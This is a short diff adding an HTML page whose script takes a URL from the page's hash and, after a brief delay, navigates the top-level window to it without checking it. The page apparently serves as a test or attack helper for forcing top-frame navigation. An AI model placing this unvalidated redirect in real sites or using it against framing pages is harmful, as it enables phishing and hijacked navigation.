@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<script>
+  // Read target URL from hash and navigate top to it
+  setTimeout(function() {
+    var target = decodeURIComponent(location.hash.substring(1));
+    if (target) {
+      try { top.location.href = target; } catch(e) {}
+    }
+  }, 300);
+</script>
+</body>
+</html>
